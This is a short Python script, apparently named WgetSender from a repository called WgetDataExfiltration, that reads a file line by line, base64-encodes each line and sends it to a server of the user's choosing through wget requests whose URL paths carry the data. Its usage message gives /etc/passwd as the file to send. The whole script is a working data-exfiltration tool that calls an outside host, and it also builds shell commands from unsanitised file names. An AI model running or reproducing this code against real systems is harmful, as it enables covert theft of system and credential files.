import sys
import os
import subprocess
import base64


def read_file(host, file_name):
	#Determine a number lines of a file
	lines  = int(subprocess.check_output(f"cat {file_name} | wc -l", shell=True).decode("utf-8"))
	#Reading file process
	for counter in range(1,lines):
		converted_line = base64.b64encode(subprocess.check_output(f"cat {file_name} | sed -n {counter}p", shell=True))
		line_txt = str(converted_line.decode("utf-8"))
		if (len(line_txt) <= 70):
			print(line_txt)
			os.system(f"wget -qO- {host}/{line_txt} -O/dev/null")
		else:
			half = int(len(line_txt)//2)
			os.system(f"wget -qO- {host}/{line_txt[:half]} -O/dev/null")
			os.system(f"wget -qO- {host}/{line_txt[half:]} -O/dev/null")
	
if __name__ == '__main__':
	banner = """
=========================================================
*	WgetDumper Server				*
*	Coded by: SidHawks				*
*							*
*  https://github.com/sidhawkss/WgetDataExfiltration	*
=========================================================
	"""
	try:
		read_file(str(sys.argv[1]), str(sys.argv[2]))
		print(banner)
		print("[*]Sending to the server...")
	except:
		print(banner)
		print("[!]Error on loading the function...\n   You need to provide 2 arguments, the IP of the server and the name of the file.")
		print("   $ python WgetSender.py 192.168.1.13 \"/etc/passwd\"")
		sys.exit(2)
